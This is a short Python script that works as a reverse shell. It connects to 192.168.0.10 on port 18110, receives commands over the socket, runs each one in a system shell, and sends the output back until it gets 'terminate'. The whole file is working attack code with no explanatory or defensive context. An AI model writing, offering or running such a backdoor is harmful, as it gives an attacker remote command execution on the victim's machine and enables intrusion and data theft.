import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.0.10', 18110))

    while True:
        command = s.recv(1024).decode()

        if 'terminate' in command:
            s.close()
            break
        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())

            if CMD.stderr is not None:
                s.send(CMD.stderr.read())

def main():
    connect()

main()
